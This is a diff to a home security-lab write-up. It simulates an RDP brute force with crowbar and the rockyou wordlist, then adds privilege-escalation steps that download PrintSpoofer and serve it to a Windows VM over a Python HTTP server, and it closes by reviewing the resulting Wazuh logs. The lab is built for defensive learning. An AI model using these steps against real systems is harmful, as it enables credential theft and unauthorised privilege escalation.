@@ -29,7 +29,7 @@ Now we want to inspect whether or not logs are being forwarded to Wazuh. Login t
 
 These configuartions will act like an EDR for our endpoint systems. I made this decision because IDS have become less reliable beacuse of encrypted traffic, but are still useful. Therefore, I will not only use EDR for endpoint defense, but also conifgure suricata rules for network defense.
 
-Now I will simulate a brute force attack using Windows Remote Desktop Protocol and collecting logs of the attack.
+Now I will simulate a brute force attack using Windows Remote Desktop Protocol and collecting logs of the attack. First I will collect the login credientals of a user and then peform a privlage escilation. 
 
 To do this first opent the kali linux virtual machine. Open the terminal to enter the command sudo apt-get update && sudo apt-get upgrade -y. After it has finished downloading create a directory with the command mkdir <Directory_Name>. We will download crowbar onto the Kali Linux machine to do this enter the command sudo apt-get install -y crowbar. Cd into the /usr/share/wordlists/ directory to find the Rockyou.txt file and unzip it with gunzip.
 
@@ -39,6 +39,8 @@ Then copy the rockyou.txt file to the ad-project directory. Enter the directory 
 
 <img width="630" height="346" alt="image" src="https://github.com/user-attachments/assets/e3cc7501-3cdd-4fc3-9760-602afe55a4ef" />
 
+After the login credentials have been compromised run the command wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O printspoofer.exe on the Kali Linux machine to create a script for privlage escalation. After it has been downloaded on the kali linux machine start a http server with Python using the command python3 -m http.server 8000. On the Windows 10 VM enter http://10.200.30.10:8000 and download the printSpoofer.exe file. 
+
 This confirms success and that the user system has now been comprimised. Now I will like to look at the logs generated as a result of this. Login to the Wazuh dashboard and enter the credintals. Select Modiules -> security Events and enter the number 4625(this number correlates to failed login attempts). 
 
 <img width="1047" height="535" alt="image" src="https://github.com/user-attachments/assets/918492ba-a63c-42ea-8af2-c8db87b0f1e4" />
@@ -46,6 +48,7 @@ This confirms success and that the user system has now been comprimised. Now I w
 Open the log to see more detailed information about how the attempt.
 
 <img width="692" height="761" alt="image" src="https://github.com/user-attachments/assets/452896e0-2d4c-4d76-9825-835f14028d49" />
+
 
 <img width="820" height="698" alt="image" src="https://github.com/user-attachments/assets/4b3b2513-ff99-4177-95b1-220bc340cf32" />
 
